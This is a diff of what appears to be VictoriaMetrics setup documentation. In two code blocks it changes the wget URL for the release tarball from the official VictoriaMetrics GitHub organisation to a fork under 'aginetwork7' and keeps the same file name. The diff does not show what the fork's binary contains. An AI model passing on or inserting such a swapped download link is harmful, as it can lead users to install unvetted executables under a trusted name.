@@ -30,7 +30,7 @@ scrape_configs:
 After you created the `scrape.yaml` file, download and unpack [single-node VictoriaMetrics](https://docs.victoriametrics.com/) to the same directory:
 
 ```
-wget https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/v1.106.0/victoria-metrics-linux-amd64-v1.106.0.tar.gz
+wget https://github.com/aginetwork7/VictoriaMetrics/releases/download/v1.106.0/victoria-metrics-linux-amd64-v1.106.0.tar.gz
 tar xzf victoria-metrics-linux-amd64-v1.106.0.tar.gz
 ```
 
@@ -146,7 +146,7 @@ Then start [single-node VictoriaMetrics](https://docs.victoriametrics.com/) acco
 
 ```yaml
 # Download and unpack single-node VictoriaMetrics
-wget https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/v1.106.0/victoria-metrics-linux-amd64-v1.106.0.tar.gz
+wget https://github.com/aginetwork7/VictoriaMetrics/releases/download/v1.106.0/victoria-metrics-linux-amd64-v1.106.0.tar.gz
 tar xzf victoria-metrics-linux-amd64-v1.106.0.tar.gz
 
 # Run single-node VictoriaMetrics with the given scrape.yaml
